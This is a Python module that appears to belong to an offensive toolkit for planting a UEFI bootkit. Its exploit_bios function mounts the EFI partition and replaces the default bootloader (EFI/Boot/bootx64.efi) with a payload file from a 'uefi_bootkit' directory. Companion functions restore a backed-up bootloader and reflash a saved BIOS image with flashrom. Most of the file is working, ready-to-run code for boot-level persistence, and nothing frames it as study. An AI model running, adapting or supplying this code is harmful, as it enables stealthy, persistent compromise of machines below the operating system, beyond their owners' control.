# modules/bios_exploit_ext.py

import subprocess
import os
from pathlib import Path
import tempfile
import logging
import shutil

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def exploit_bios():
    """
    Uses flashrom or fwupd to write the payload_uefi.efi into the UEFI partition.
    """
    try:
        logging.info("Starting BIOS/UEFI exploit...")
        p = Path(__file__).parent.parent / "uefi_bootkit" / "payload_uefi.efi"
        if not p.exists():
            logging.error("Payload file not found.")
            return "[!] payload_uefi.efi not found."

        # Identify EFI partition (e.g. /dev/sda1)
        out = subprocess.check_output("lsblk -o NAME,MOUNTPOINT | grep /boot/efi", shell=True).decode().split()
        if not out:
            logging.error("EFI partition not found.")
            return "[!] EFI partition not found."
        dev = "/dev/" + out[0]
        mount_point = tempfile.mkdtemp()
        logging.info(f"Mounting EFI partition: {dev}")
        subprocess.run(f"mount {dev} {mount_point}", shell=True, check=True)

        dest = os.path.join(mount_point, "EFI", "Boot", "bootx64.efi")
        logging.info(f"Replacing bootloader at: {dest}")
        subprocess.run(f"cp {str(p)} {dest}", shell=True, check=True)

        subprocess.run(f"umount {mount_point}", shell=True, check=True)
        logging.info("BIOS/UEFI exploit deployed successfully.")
        return "[*] BIOS/UEFI exploit deployed (bootloader replaced)."
    except Exception as e:
        logging.error(f"Error during BIOS/UEFI exploit: {e}")
        return f"[!] exploit_bios error: {e}"

def remove_bios_exploit():
    """
    Attempts to restore the stock EFI bootloader from backup.
    """
    try:
        logging.info("Starting removal of BIOS/UEFI exploit...")
        backup_path = Path("/backup/efi/bootx64.efi")
        if not backup_path.exists():
            logging.error("Backup bootloader not found.")
            return "[!] Backup bootloader not found."

        # Identify EFI partition (e.g. /dev/sda1)
        out = subprocess.check_output("lsblk -o NAME,MOUNTPOINT | grep /boot/efi", shell=True).decode().split()
        if not out:
            logging.error("EFI partition not found.")
            return "[!] EFI partition not found."
        dev = "/dev/" + out[0]
        mount_point = tempfile.mkdtemp()
        logging.info(f"Mounting EFI partition: {dev}")
        subprocess.run(f"mount {dev} {mount_point}", shell=True, check=True)

        dest = os.path.join(mount_point, "EFI", "Boot", "bootx64.efi")
        logging.info(f"Restoring bootloader from backup to: {dest}")
        subprocess.run(f"cp {str(backup_path)} {dest}", shell=True, check=True)

        subprocess.run(f"umount {mount_point}", shell=True, check=True)
        logging.info("BIOS/UEFI exploit removed successfully.")
        return "[*] BIOS/UEFI exploit removed (bootloader restored)."
    except Exception as e:
        logging.error(f"Error during removal of BIOS/UEFI exploit: {e}")
        return f"[!] remove_bios_exploit error: {e}"

def unbrick_bios():
    """
    Uses `flashrom` to restore a known-good BIOS image.
    """
    try:
        logging.info("Starting BIOS unbricking process...")
        bios_image = Path("/backup/bios_image.bin")
        if not bios_image.exists():
            logging.error("Known-good BIOS image not found.")
            return "[!] Known-good BIOS image not found."

        logging.info("Flashing BIOS with known-good image...")
        subprocess.run(f"flashrom -p internal -w {str(bios_image)}", shell=True, check=True)
        logging.info("BIOS unbricked successfully.")
        return "[*] BIOS unbricked successfully."
    except Exception as e:
        logging.error(f"Error during BIOS unbricking: {e}")
        return f"[!] unbrick_bios error: {e}"
